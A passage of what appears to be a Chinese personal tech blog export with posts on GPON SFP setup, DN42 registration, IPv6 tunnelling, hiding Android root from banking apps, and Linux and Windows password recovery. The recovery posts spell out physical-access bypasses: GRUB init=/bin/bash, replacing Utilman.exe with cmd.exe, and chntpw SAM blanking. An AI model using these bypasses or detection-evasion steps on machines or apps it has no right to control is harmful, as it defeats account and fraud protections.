Vendor ID: 小烏龜上拿到的 “GPON 序號” 前面四碼大寫英文
software version 1: 小烏龜上拿到的 “軟體版本”
software version 2: 如果小烏龜沒有就直接填跟上面一樣
Product Class: 你的小烏龜型號
HW Version: 理論上也跟上面一樣
Device Serial Number: 小烏龜上有一張貼紙寫的超長的 S/N

這邊要注意絕對不要動到 MAC 跟 MACKEY因為這邊的 KEY 是要用算的不能亂填不然光貓棒會無法通過驗證
填完後也可以按 Apply Changes

接著就到 Commit/Reboot 頁面儲存重啟光貓棒讓設定生效

重啟是否完成可以參考上面提到的在 ROS 的 Interface 介面看是否出現 R 標誌然後到 PON 介面看一下 ONU State 是否有正常顯示 O5

但這狀態我遇到即使設定亂給都是 O5 不通也是 O5所以看看就好真正有沒有通還是要看接下來的步驟有沒有顯示 vlan id


接著透過 telnet 去連接光貓棒然後下指令
omcicli mib get 84

如果有正常出現以下兩個 vlan 資訊恭喜你已經渡過最麻煩的部分了

這邊的 vlan id 每個人都不一樣所以不能照抄喔 XD


如果沒有的話可以直接上 中華電信的障礙申告頁面點寬頻上網問題然後點訊號重置

然後等待重新啟動完再去看一次 mib 84
這邊出現的兩組 vlan id 先記錄下來通常數字小的為撥號網路用數字較大的為 MOD 使用
接著去光貓棒上的 VLAN Settings將剛剛數字小的 vlan id 填入 Manual 的 PVID 中

接著就一樣去 commit restart
設定 PPPoE到這步驟基本上應該大家都會了不過還是一併寫完有始有終
大家可以先去 RouterOS 當中的 PPP 選 PPPoE Scan然後將網卡選 SFP然後按下 Start
如果有看到出現一台 BRAS 出現就代表前面的步驟都有成功

後續就是新增一個 PPPoE Client然後輸入自己的 HN 資訊就可以開始正常使用網路啦 ~

最後附上一張測速的圖完結灑花

]]></content>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>DN42 - 平民化的 ASN</title>
    <url>/posts/2021-08-23-DN42-%E5%B9%B3%E6%B0%91%E5%8C%96%E7%9A%84-ASN/</url>
    <content><![CDATA[其實應該先寫這篇才寫現實網路世界中的 ASN 教學才對 wwww不過我也是先申請了現實的 ASN 後才來申請這個東西的 XD
DN42 全名叫做 Deserialized Network 42 (去中心化網路 42)其透過 Private IP 加上 VPN 來模擬現實的 ASN 系統這是它們的官網


其實真的介紹就上面這樣而已 XD接下來要說說申請的部分我個人認為比申請現實的 ASN 複雜了許多
申請首先我們到 dn42 的 wiki在接下來操作的同時希望除了這篇文章以外也能配著看這份文件
首先我們先到 dn42 自己的 repo 申請一個帳號整個申請過程都需要用到 git應該說 dn42 的管理以及紀錄都是在這個 repo 中推薦使用 linux 或 macos 來完成所有操作以避免困擾因為會有一些檔名 windows 不給用
那申請流程大概可以分為

建立自己的相關物件
檢查格式以及對你的 commit 用 GPG 簽名
發 pull request

建立物件首先我們需要開一個新的 branch所有申請的操作也都要在這個分支中做事分支的名稱請按照 &lt;username&gt;-YYYYMMDD/&lt;name&gt; 的格式例如我的叫做 chesskuo-20210820/register
git checkout -b chesskuo-20210820/registergit push --set-upstream origin chesskuo-20210820/register

接著我們需要準備幾個東西要先想好然後透過這個網站查詢是否已經被申請

你想要的 ASN (範圍介於 4242420000 ~ 4242423999 之間)
你要的 IPv4 Range
你要的 IPv6 Range

對於上面三個東西會推薦使用網站中的 Free Explorer 幫你 random他會自動選幾個沒有被使用且符合規範的 ASN 或是 IP 給你選
挑好後就要開始建立對應的物件到 data/ 資料夾中
最少需要以下

mnter
person
aut-num
inetnum
inet6num

那會推薦順便連以下兩個都順便填寫

route
route6

mntermnter 是 maintainer 的縮寫這個物件非常重要是全部物件都會引用的東西由於 dn42 是透過 git 的編輯方式所以其實你可改動到不是你的 mnter 的物件但是在現實世界中註冊商是不會讓你更動到沒有引用你的 mnter 的物件的
格式官方有提供一個範本檔案名稱請遵循 &lt;name&gt;-MNT 且放在 data/mnter/ 底下
mntner:             FOO-MNTadmin-c:            FOO-DN42tech-c:             FOO-DN42mnt-by:             FOO-MNTauth:               pgp-fingerprint 0123456789ABCDEF0123456789ABCDEF01234567source:             DN42

這邊的 admin-c, tech-c 就是填等等要新增的 person 物件auth 的部分官方也有提供 ssh key 的驗證方式詳細可以自己去翻文件我自己是用 PGP 因為覺得比較潮 (x
之後包跨這裡的 mnt-by 全都是填這個 mnter
person用來記錄一個人的相關資訊
檔名格式 &lt;name&gt;-DN42放在 data/person/
person:             John Doee-mail:             john.doe@example.comnic-hdl:            FOO-DN42mnt-by:             FOO-MNTsource:             DN42

aut-numASN 資訊
檔名格式為 ASxxxxxxxxxxx (xxx 為數字)放在 data/aut-num/
aut-num:            AS4242423999as-name:            AS-FOO-DN42admin-c:            FOO-DN42tech-c:             FOO-DN42mnt-by:             FOO-MNTsource:             DN42

inetnumIPv4 range 宣告透過上面說到的 Free Explorer 可以隨機給你一組
檔名格式用以下這個例子當範例就是 172.20.150.0_27放在 data/inetnum/
inetnum:            172.20.150.0 - 172.20.150.31cidr:               172.20.150.0/27netname:            FOO-NETWORKadmin-c:            FOO-DN42tech-c:             FOO-DN42mnt-by:             FOO-MNTstatus:             ASSIGNEDsource:             DN42


inet6numIPv6 range 宣告透過上面說到的 Free Explorer 可以隨機給你一組
檔名格式用以下這個例子當範例就是 fd35:4992:6a6d::_48放在 data/inet6num/
inet6num:           fd35:4992:6a6d:0000:0000:0000:0000:0000 - fd35:4992:6a6d:ffff:ffff:ffff:ffff:ffffcidr:               fd35:4992:6a6d::/48netname:            FOO-NETWORKdescr:              Network of FOOcountry:            XDadmin-c:            FOO-DN42tech-c:             FOO-DN42mnt-by:             FOO-MNTstatus:             ASSIGNEDsource:             DN42

route用來宣告該 IPv4 Range 屬於哪一個 ASN
檔名格式與 inetnum 相同放在 data/route/
route:              172.20.150.0/27origin:             AS4242423999mnt-by:             FOO-MNTsource:             DN42

route6用來宣告該 IPv6 Range 屬於哪一個 ASN
檔名格式與 inet6num 相同放在 data/route6/
route6:             fd35:4992:6a6d::/48origin:             AS4242423999max-length:         48mnt-by:             FOO-MNTsource:             DN42

檢查在物件都建立好之後可以使用根目錄給的 fmt-my-stuff 來幫你將格式 format 好因為有可能在修改範例的過程中少一個空白或怎麼樣之類的
接著使用 check-my-stuff 來檢查我們自己的相關物件是否正確

簽名確定檢查也通過後我們就可以將這次的變更 commit 並加上簽名這邊我是使用 GPG在 commit 時加上 -S 的參數就可以簽名
git commit -m &quot;xxx&quot; -S

簽完後利用 git log --show-signature 就可以檢查你的 commit 是否有簽名

發 PR接著只要將我們的 branch push 到 remote repo接著透過 Web GUI 發個 PR並且等待管理員審核就可以囉~
END這篇主要介紹如何使用 DN42這裡是我的 DN42 的一些資訊 Link之後的文章將會帶著大家直接動手開始建置自己的網路系統包括打 Tunnel, Peer, 建制自己的 DNS Server 之類的
]]></content>
      <tags>
        <tag>network</tag>
        <tag>ASN</tag>
      </tags>
  </entry>
  <entry>
    <title>把自己的 IPv6 接回家</title>
    <url>/posts/2022-03-06-%E6%8A%8A%E8%87%AA%E5%B7%B1%E7%9A%84-IPv6-%E6%8E%A5%E5%9B%9E%E5%AE%B6/</url>
    <content><![CDATA[關於這是一個被我閒置到忘記的一件事…
從申請到 ASN 以及拿到自己的一段 &#x2F;44 IPv6 後過了半年多了被一堆垃圾事纏身到完全忘記這件事兩星期前才突然想到然後把它搞定wwwww


前置任務首先當然是要先把我屬於我們的 IPv6 Prefix 宣告出去啦這邊就不多做說明了請參考前面 ASN 初體驗 Part 2
設定隧道當確定路由成功宣告出去後我們需要將邊界路由預定發給家中的 IPv6 路由到家中的路由器上這時就需要透過隧道直接將兩台接起來
這邊使用一個最方便快速的 IPv6 乘載方式 : SIT tunnel (Simple Internet Transition tunnel 或稱 6in4 tunnel)他是一種 “透過 IPv4 將兩點接起來” 且 “只能傳送 IPv6 流量” 的隧道
情境大致上需要三個步驟

我們對外宣告 2a0f:607:1500::/48 走到我的 Vultr 邊界路由上
將 Vultr 與家中的 ASUS 路由器用 SIT 接起來
設定路由表讓邊界路由知道流量要從 SIT 送至家中 ASUS

其實雖然說分為三步驟但其實全部都可以用一個檔案搞定
Vultr 邊界路由那邊我們直接來看邊界路由上設定 SIT tunnel 如何做的

&#x2F;etc&#x2F;network&#x2F;interfaces.d&#x2F;sit-homeauto sit-homeiface sit-home inet6 v4tunnel    address 2a0f:607:150f:ffff::/127    endpoint xxx.xxx.xxx.xxx    ttl 64    post-up ip -6 r add 2a0f:607:1500::/64 via 2a0f:607:150f:ffff::1

稍微解說一下格式

endpoint
要填另一邊 IPv4 (也就是家裡的 IPv4)


post-up
網卡啟動後會做的事
加上一條路由告訴邊界路由 2a0f:607:1500::/64 要往這個隧道的另一端送



家中 ASUS 路由器那邊去到 IPv6 設定那頁設定填上對應的東西


Server IPv4 Address
就是填邊界路由的地址



最後記得把最下面的 Auto Config 打開那就是所謂的 RA (Router Advertisement) 負責處理 SLAAC也就是會讓裝置自動取得 IPv6這邊要注意前綴長度一定要大於等於 64 才能使用 SLAAC
驗證到這邊也都設定完成了先從家中設備看一下是否有正常取得 IPv6

接著 ping 一下外網 IPv6 的機器看看有沒有通

OK 都正常到這邊就全部完成了
最後整個過程其實並不複雜對於路由運作如果夠熟悉這些操作可以說幾乎一瞬間就完成了
最後放一下精美的路線圖我們從 Vultr 新加坡伺服器測試走到家中的路會長怎樣

順便預告一下接下來會寫關於自己內網建設過程的一些紀錄至於會有幾篇不知道不過內容大概會包括一些關於隧道、IPsec 踩過的坑、OSPF、基礎建設之類的東東
敬請期待 ٩(ˊᗜˋ*)و
]]></content>
      <tags>
        <tag>network</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 14 Root 生命鬥士</title>
    <url>/posts/2024-09-16-Android-14-Root-%E7%94%9F%E5%91%BD%E9%AC%A5%E5%A3%AB/</url>
    <content><![CDATA[因為我的手機是一台古董 Pixel 5不能用最新最潮的 KernelSU再加上遇到幾個 module 過舊或是更新導致一瞬間原本能動的銀行 APP 全都失效因此花了點時間將 root 環境重新隱藏起來
所以這篇就是一個順手記錄與各大金融 APP 拼命的結論然後再順便從頭教學一下怎麼 root 自己的手機 XD


其實前面說我的系統 kernel 過舊不能用 KernelSU 也是不太對只是我一直 build 不出可以正常開機的 kernel以及 KernelSU 也宣佈從 v0.9.5 後不再支援通用內核以外的舊版或客製化內核因此權衡一下還是繼續使用 Magisk 好了 XD
之前我繞 root 的環境挺單純的就 Kitsune Magisk 26.4 + PlayIntegrityFix 而已不得不說 Kitsune 原本就蠻強了混淆了 package name 後確實就已經讓許多金融 APP 抓不到了
起因但幾週前我更新了 Android 中的 Google Play 系統更新 (不是 Google Play 商店的更新)導致 Zygisk 跟 LSPosed 19.2 會相衝而 LSPosed 19.2 也是一個很久沒更新的東西了
以及我的 LINE Pay 突然被查殺推測可能是 LINE 偷掃了 app list
這時候其實我還沒用 Hide My Applist我的 LSPosed 是去做別的事情用的但現在 LSPosed 也葛屁了
接著又加上 Kitsune 的 release 太久沒更新還有之前用了 Kitsune beta 有爆炸的經驗剛好又看到 Magisk 有最新的 beta 可以用於是就想說來個大換血好了 XD
總之完全是種種因素疊加導致我除了想大換血以外也想更結構性的去理解每個元件之間的搭配
那接著就直接開始動手操作的環節啦 ~
前置作業在安裝前我們要先準備兩樣東西

adb 環境
你手機系統的 boot.img
解鎖 bootloader


第一點需要手動配置一下系統環境


如果你不想要安裝又肥又大的 Android Studio 的話

首先到 這裏 來下載 platform-tools然後配置進你的環境變數會比較方便當然你也可以直接進資料夾做使用

第二點各個廠商自己提供的方式都不一樣我就以 Pixel 5 來舉例Google 會將 Pixel 系列的系統映像檔或是 OTA 升級包統一都放在 https://developers.google.com/android/images 當中

然後我們需要檢查一下手機目前的系統版本可以至 設定 -&gt; 關於手機 -&gt; Android 版本 -&gt; 版本號碼 中確認

以我的為例我的版本號碼為 UP1A.231105.001.B2
因此找到 Pixel 5 欄位的相同版本

然後點右邊的下載即可拿到官方映像檔
下載完成後要解壓縮再將裡面的 image-xxxx.zip 解壓縮會得到 boot.img

要將這個先傳進手機裡

第三點

這個根據每家廠商不同可能要再請讀者自行上網找資料了只是這步驟也是最重要的因為沒有解鎖的話是不能刷任何其他韌體進去的
安裝這邊內容除了安裝過程外還會一邊穿插過程中遇到的套件間的問題因此整個過程會有點長 XD
安裝 Magisk首先當然就是要有請 root 界中的經典面具上場啦我們選用最新的 beta 版本 27007下載 github release 內的 app-release.apk 安裝
接著就按照 官方文件 找尋適合你手機的方式將 magisk 安裝好因為每家廠商的手機對於 root 該刷的位置都有不同是適應方式這邊我舊粗淺講一下我的步驟 (應該也是所有 Pixel 系列的步驟)
adb reboot fastbootfastboot flash boot magisk-xxxx.imgfastboot reboot

刷好新的 boot.img 後重啟進入 magisk 應該就會看到上面那區的 magisk 寫了已安裝的版本而不是 N/A 了

安裝一堆模組確定 magisk 成功安裝後下一步就是要把重要的模組一一安裝進去總共會需要以下幾個 magisk 模組

PlayIntegrityFix (通常簡稱 PIF)
Zygisk-Next
Shamiko
LSPosed MOD

這邊要注意絕對不要啟用 magisk 設定中自帶的 zygisk不確定是不是原本自帶的有問題導致 root 會一直被抓到直接使用 zygisk-next 來替換掉才可以正常隱藏
另外就是不要使用原本的 LSPosed 1.9.2因為那個版本已經非常久沒更新會導致在最新的 Google Play 系統更新 202408 的版本會出現問題導致 Zygisk 會無法啟動使用這個 MOD 版可以修正此問題
至於 PIF 就是為了能過 safetynet 檢查讓它至少是 BASIC 狀態來規避一些檢查
shamiko 則是基於 zygisk 的模組可以隱藏 Zygisk, Zygisk 模組以及 Magisk root 的一個閉源模組使用時不可以開啟 Magisk 的強制黑名單
安裝順序推薦 Zygisk-Next 優先然後才安裝其他基於 Zygisk 的模組 (例如 Shamiko 以及 LSPosed)而 PIF 要先裝或後裝都沒差
最後則是在 LSPosed 模組安裝完成後添加一個叫做 Hide My Applist 的應用程式 (通常簡稱 HMA)
設定 root 隱藏躲避檢查在模組都安裝完畢後要開始進行 root 隱藏
首先要藏起來的是 magisk app 本身這個從 app 的設定中有一個 “隱藏 Magisk” 的選項選擇後可以自己輸入想要的 app name我是為了怕找不到所以用一點變形的字串 Mag1sk 來方便辨識但又不要以原本的 magisk 來命名
轉換結束後應該會發現 app 清單中多了一個初始 android 娃娃頭像的 app

而這個 app 的 package name 則是一組亂數產生的包名因此可以繞過大多數對於 app list 進行黑名單比對的檢查方法
再來要進入 “設定黑名單” 當中將你要用到的 APP 全部勾起來來使 MagsikHide 生效
通常到這步驟多數的銀行 APP 應該已經可以穩定通過了
規避 app list 掃描最後要隱藏的部分則是某些 app 會掃描 app list 的行為我們要透過 HMA 來 hook 這些掃描行為進而達到掃不到特定跟 root 有關的 app
先點開上面通知欄中的 LSPosed 管理介面

然後在第二項的模組清單將 HMA 啟用

接著回到 app 清單中找到它點開開始設定

再來點開模板管理選擇新增一個黑名單模板然後填一個你喜歡的名字

這邊有兩個選項分別為

對應用程式執行攔截
對應用程式啟用

這邊中文挺怪的總之可以理解為

要把哪些 app 藏起來不被掃到
要讓哪個 app 看不到上面藏起來的 app (有點繞口 XD)

總之只要先調上面那個就好
這裡我們主要要藏兩個東西

HMA app 本身
Magisk 混淆後的 app

勾起來後記得一直上一步退回 HMA 主畫面不然有時候他會沒儲到
再來就是進入 “管理應用程式”然後找到你要的 app (這邊我範例使用 LINE)

點選 “啟用隱藏”然後記得在下面的模板設定使用前面新增好的模板然後一樣一直上一頁來讓他觸發儲存接著就可以重新開機來確認一下是否能成功進入 LINE Pay 做使用囉
測試隱藏是否生效如果前面的步驟都有做正確基本上到這裡用到的技巧幾乎能躲過所有的金融 APP 檢測了
如果還是沒有成功這裡推薦幾個 APP 可以讓你檢查自己的環境是否有設定正確分別是

Momo (原始版本存在某一個 tg 頻道裡)

檢查系統 root 環境是否有藏好
跟 magisk 有關的設定


Applist Detector

檢查你環境中有沒有什麼奇怪的 app 或是 api 跟 root 有關
通常跟你的 HMA 有沒有藏好有關


YASNAC (Play 商店找得到)

檢查你的 safetynet 是否有 pass
跟 PIF 有關






目前我手頭上有在使用的銀行跟行動支付工具按照上面的方式都是可以繞過檢查至於更多的其他 APP 能不能繞過就不確定了或是可能哪天一更新又全部被查殺也是有機會 XD因為檢測手法千奇百怪只能等真的遇到才能想辦法找出程式的判斷邏輯去應
]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>System Recovery - Linux</title>
    <url>/posts/2024-11-27-System-Recovery-Linux/</url>
    <content><![CDATA[剛好最近無聊在研究如果碰的到實體機器但卻沒有帳密 或是忘記帳密時有沒有什麼手段可以進去系統改掉密碼
起初是研究 windows 該怎麼辦到後來想說連 linux 一起研究於是就產生了這篇


直接進入主題這次使用的測試環境如下

Debian 12.8
GNU GRUB 2.06 (其實就是系統裝起來預設自帶的)

首先開機進入 grub 畫面

按照底下敘述按 e 可以進入編輯模式

接著滑到最下面有一條 linux 的欄位

根據 grub 官方文件 可以知道後面需要傳遞 linux kernel image 以及相關參數詳細資訊可以從 kernel.org 官方文件 查詢
我們目前只需要知道 ro 代表之後啟動的系統掛載起來是唯讀因此需要改成 rw 才可以更動系統內的檔案
接著要多一個參數 init 在最尾部這是控制啟動系統後要載入的程式直接設定成 /bin/bash 就好

最後按 ctrl + x 即可用這次變更的設定檔進入系統成功後會長這樣

這邊要注意如果維持 ro 進入系統的話會無法進行任何修改

有正確掛載進可寫的系統應該要可以如下

我們可以看到系統內有 root 跟 user 兩個使用者

這邊就拿 root 忘記密碼的情境示範嘗試修改 root 密碼為 root2 並且進入系統

最後記得打個 sync 讓更動確定寫回 file system因為在這個狀態下的系統非常陽春沒有太多其他的底層維護 daemon 介入因此需要盡量保證系統穩定
最後就可以直接重開機啦但是會發現打了 reboot 卻噴 error

原因是我們在最一開始 grub 啟動的時候是直接用 /bin/bash 進入的並沒有讓 systemd 啟動因此沒辦法維護系統狀態這邊就需要透過手工對 kernel 送重啟訊號了
首先要啟用 sysrq 的功能可以參考 kernel.org 官方文件
1 代表啟用全部的功能
echo 1 &gt; /proc/sys/kernel/sysrq

然後送 b 給 /proc/syseq-trigger 代表立刻重啟系統
echo b &gt; /proc/sysrq-trigger

開機完成正常的系統後輸入剛剛改過的密碼 root:root2 就成功進入系統了

]]></content>
      <tags>
        <tag>mgnt</tag>
      </tags>
  </entry>
  <entry>
    <title>System Recovery - Windows</title>
    <url>/posts/2024-11-26-System-Recovery-Windows/</url>
    <content><![CDATA[一切的起因就是某天晚上一個朋友說他的 windows 忘記密碼然後錯太多次被鎖起來然後他的電腦有啟用 bitlocker
本來想找公司 infra 幫忙解但他說好像印象中以前 infra 是用 WinPE 解的樣子結果 bitlocker 的 key 就變了
但我想想不太合理改密碼是 bitlocker 解鎖硬碟後對檔案系統的行為怎麼會改個密碼連 bitlocker key 都變了於是就花了點時間研究到底 windows 忘記密碼的還原流程到底是如何


先說結論有兩種方式

用原本那台忘記密碼的 windows 系統即可
把硬碟掛去一台 linux 底下用工具救

測試環境

Windows 11
enabled BitLocker

recovery from same windows system
不囉嗦總之登不進去就對了

然後到右下角的電源鈕按住 shift + 右下角的 Restart就會進到 recovery mode

接著點 Troubleshoot

然後點 Advanced options

這邊就會出現 Command Prompt 的選項了點下去會先要你輸入 BitLocker 的解密金鑰然後就會送你一個 cmd.exe


接著要找一下你的系統槽是在這個 recovery mode 的哪可以用 wmic 列一下邏輯槽出來看一下
wmic logicaldisk get deviceid,volumename


通常沒意外都是 C 槽才對就直接 cd 切換過去吧

到這邊我們就要先了解一個事情在鎖定畫面的狀態下右下角第二個那個小人圖標本身其實是一個 exe (Utilman.exe)

點開後的每一個功能本身也都是一個 exe

所以思路就是去替換掉其中一個 exe 來啟動 cmd.exe我們這邊就拿小人圖標開刀
直接切過去 System32 裡面然後將 Utilman.exe 先備份一下最後將 cmd.exe 複製成 Utilman.exe

到這邊已經差不多了可以關掉 cmd 然後正常進入系統
開機完成後去點那個小人圖標就會跳出一個高權限的 cmd.exe 了

最後直接舒舒服服的 net user 改你要的帳號的密碼即可然後就可以舒舒服服去登入系統啦



recovery from linux這邊就有點小麻煩因為要把硬碟拆下來插去另一台主機上所以如果能用原本的 windows 系統主機來復原當然是最好 XDD
接著進入正題把硬碟插去 linux 上先用 fdisk 檢查一下到底哪一顆是我們要的

可以看到有一個寫著 Microsoft basic data 就是我們的目標而他在的分割區為 /dev/sda3
接著我們需要使用到一個工具叫做 dislocker
它的用處是可以處理 Windows BitLocker 硬碟解密後掛載成 FUSE 結構然後再讓我們把裡面的 NTFS 系統 mount 起來用這樣就可以達到真正修改加密磁碟後裡面的內容
安裝的話直接
apt install -y dislocker

使用上首先要創兩個資料夾準備給掛載用這邊統一在 /mnt/ 底下做

如同上面所說dislocker 需要先將 BitLocker 解密然後形成 FUSE 結構所以需要有一個 decrypt/ 資料夾來存放 block file dislocker-file
dislocker -V &lt;你上面看到的 Windows 分割區&gt; -p&lt;bitlocker-key&gt; -- &lt;掛載點&gt;



在這個步驟如果出現錯誤可能是因為 apt 預設裝的 dislocker 版本有問題改從 官方 Github 拉下來自己編譯應該就可以解決我這邊測試時用的是 Debian 就有撞到如果改用 Kali 就沒有問題

接著將這個 block file 掛載起來在 c/ 資料夾中即可看到 Windows 系統檔案了
mount -o loop /mnt/decrypt/dislocker-file /mnt/c



這邊也有機會踢到一個問題就是找不到 NTFS driver記得要 apt install nfts-3g 一下

掛載完成後我們需要使用 chntpw 來對 Windows 的 SAM 進行操作以還原帳號密碼
apt install -y chntpw

接著去讀取一下 SAM 的內容看看有哪些使用者存在SAM 在 Windows 系統中的路徑為 C:\Windows\System32\config\SAM
chntpw -l Windows/System32/config/SAM


這邊就拿 User 舉例
chntpw -u User Windows/System32/config/SAM


chntpw 只能直接清空密碼直接選 1 然後退出即可

接下來就按照順序 umount NTFS 磁碟跟 Bitlocker 區塊然後就可以把硬碟插回去給 Windows 開機看看 User 這位使用者是否可以無密碼直接登入
umount /mnt/cumount /mnt/decrypt


成功不用密碼就能直接登入了
]]></content>
      <tags>
        <tag>mgnt</tag>
      </tags>
  </entry>
</search>
